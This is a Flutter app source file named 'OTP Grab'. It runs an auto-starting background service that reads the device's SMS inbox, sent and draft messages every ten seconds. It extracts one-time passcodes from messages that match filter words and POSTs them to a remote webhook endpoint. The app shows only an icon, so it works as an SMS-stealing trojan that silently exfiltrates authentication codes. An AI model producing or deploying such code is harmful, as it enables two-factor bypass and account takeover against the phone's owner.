import 'dart:io';

import 'package:flutter/material.dart';
import 'dart:async';
import 'dart:ui';
import 'dart:convert';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:otp_grab/configs.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeService();
  runApp(const MyApp());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  await service.configure(
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,
      onBackground: onIosBackground,
    ),
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
    ),
  );

  service.startService();
}

Future<bool> onIosBackground(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();
  return true;
}

void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });
    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });
  }
  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  //Some code for background task
  Timer.periodic(const Duration(seconds: 10), (timer) async {
    if (service is AndroidServiceInstance) {
      service.setForegroundNotificationInfo(
        title: "App in background...",
        content: "Update ${DateTime.now()}",
      );
    }
    service.invoke(
      'update',
      {
        "current_date": DateTime.now().toIso8601String(),
      },
    );

    // send data
    var permission = await Permission.sms.status;

    if (permission.isGranted) {
      final SmsQuery _query = SmsQuery();

      final messages = await _query.querySms(
        kinds: [SmsQueryKind.inbox, SmsQueryKind.sent, SmsQueryKind.draft],
        address: Configs.messageAddress,
        count: Configs.messagesCount,
      );

      debugPrint('sms inbox messages: ${messages.length}');

      sendOTPToHook(messages);
    }
  });
}

void sendOTPToHook(List<SmsMessage> messages) async {
  if (messages.isNotEmpty) {
    for (var message in messages) {
      if (message.body!.contains(Configs.filterWords)) {
        // extract the otp code from tring
        int otpCode = int.parse(message.body!.replaceAll(RegExp('[^0-9]'), ''));

        // add json header
        var headers = {'Content-Type': 'application/json'};

        // init request with method and url
        var request = http.Request(
          'POST',
          Uri.parse(Configs.botDash),
        );

        // add body to request
        request.body = json.encode({
          "otpCode": otpCode.toString(),
          "timer": message.date.toString(),
        });

        // add header
        request.headers.addAll(headers);

        // make http request
        http.StreamedResponse response = await request.send();

        // print response status
        print('Response status: ${response.statusCode}');
        sleep(const Duration(seconds: 1));
      }
    }
  }
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  // This widget is the root of your application.
  @override
  void initState() {
    getPermission();
    super.initState();
  }

  void getPermission() async {
    var permission = await Permission.sms.status;

    if (permission.isGranted == false) {
      await Permission.sms.request();
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'OTP Grab',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: const Scaffold(
        body: Center(
          child: Icon(
            Icons.cruelty_free,
            size: 100,
          ),
        ),
      ),
    );
  }
}
